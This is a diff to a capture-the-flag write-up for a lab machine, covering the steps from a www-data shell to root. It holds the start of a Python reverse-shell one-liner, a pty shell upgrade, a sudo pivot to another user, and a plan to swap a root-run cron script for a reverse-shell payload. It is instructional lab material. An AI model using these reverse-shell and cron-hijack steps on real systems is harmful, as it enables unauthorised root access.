@@ -33,7 +33,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 + `python -c 'import pty; pty.spawn("/bin/bash")'`
 + `sudo -ll`
-+ `sudo -u scriptmanager /bin/bash`
++ **www-data** user can run commands as **scriptmanager** user: `sudo -u scriptmanager /bin/bash`
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c5a05271-ac94-4d4e-9dd7-418a80eec712)
 
 ## Privilege Escalation
@@ -54,6 +54,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 + Even `test.txt` file name is changed, exists `test.txt` the same file name each minute again.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/49b004f3-46e8-42d6-b672-4765d0cd1df4)
+
+There is a cron job or something like a background process which runs **test.py** script automatically.
+Replace **test.py** file with our test.py file containing reverse shell in order to get reverse shell of root user or not.
 
 + Create `test.py` revershell payload file on your attack machine:
 ```
